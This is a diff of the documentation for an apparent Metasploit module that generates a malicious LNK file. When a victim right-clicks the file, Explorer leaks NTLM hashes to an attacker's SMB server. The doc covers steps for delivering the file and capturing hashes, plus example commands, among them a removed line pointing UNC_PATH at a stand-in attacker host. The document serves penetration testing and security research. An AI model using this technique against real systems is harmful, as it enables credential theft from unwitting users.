@@ -1,10 +1,7 @@
-This module generates a malicious Windows shortcut (LNK) file that embeds a special UNC path within the EnvironmentVariableDataBlock of the Shell Link structure. When a victim right-clicks the LNK file in Windows Explorer, it triggers an automatic authentication attempt to the specified remote SMB server, enabling the capture of NTLM hashes.
-
-The exploit takes advantage of how Windows handles environment variables in LNK files during context menu operations, leading to unsolicited SMB connections without requiring the file to be opened.
-
 ## Vulnerable Application
 
-Windows systems where LNK files are processed in Explorer, particularly during right-click actions that load context menus. This can result in NTLM credential leaks over SMB.
+Windows systems where LNK files are processed in Explorer, particularly during right-click actions that load context menus.
+This can result in NTLM credential leaks over SMB.
 
 References:
 - [Right-Click LNK](https://zeifan.my/Right-Click-LNK/)
@@ -14,39 +11,16 @@ Disclosure Date: 2025-05-06.
 ## Verification Steps
 
 1. Start msfconsole.
-2. Load the module: `use auxiliary/fileformat/right_click_lnk_leak`.
-3. Set required options (e.g., FILENAME, UNC_PATH).
-4. Optionally customize DESCRIPTION, ICON_PATH, or PADDING_SIZE.
-5. Execute the module: `run`.
-6. A malicious LNK file is generated.
-7. Set up an SMB capture listener (e.g., `auxiliary/server/capture/smb`).
-8. Deliver the LNK file to the target system.
-9. Right-click the LNK file in Explorer to trigger the SMB connection.
-10. Monitor the listener for captured NTLM hashes.
+1. Load the module: `use auxiliary/fileformat/right_click_lnk_leak`.
+1. Optionally customize FILENAME, DESCRIPTION, ICON_PATH, or PADDING_SIZE.
+1. Execute the module: `run`.
+1. A malicious LNK file is generated.
+1. Set up an SMB capture listener (e.g., `auxiliary/server/capture/smb`).
+1. Deliver the LNK file to the target system.
+1. Right-click the LNK file in Explorer to trigger the SMB connection.
+1. Monitor the listener for captured NTLM hashes.
 
 ## Options
-
-### FILENAME
-
-The name of the generated LNK file.
-
-Default: `msf.lnk`
-
-Example:
-```
-set FILENAME context.lnk
-```
-
-### UNC_PATH
-
-The UNC path (e.g., `\\server\share`) that the LNK will attempt to access for credential capture.
-
-Default: `\\192.168.1.1\share`
-
-Example:
-```
-set UNC_PATH \\attacker.ip\captureshare
-```
 
 ### DESCRIPTION
 
@@ -91,10 +65,6 @@ Generate the LNK file:
 
 ```
 msf > use auxiliary/fileformat/right_click_lnk_leak
-msf auxiliary(fileformat/right_click_lnk_leak) > set FILENAME context.lnk
-FILENAME => context.lnk
-msf auxiliary(fileformat/right_click_lnk_leak) > set UNC_PATH \\192.168.1.25\share
-UNC_PATH => \\192.168.1.25\share
 msf auxiliary(fileformat/right_click_lnk_leak) > set DESCRIPTION Fake Document
 DESCRIPTION => Fake Document
 msf auxiliary(fileformat/right_click_lnk_leak) > set ICON_PATH %SystemRoot%\\System32\\imageres.dll
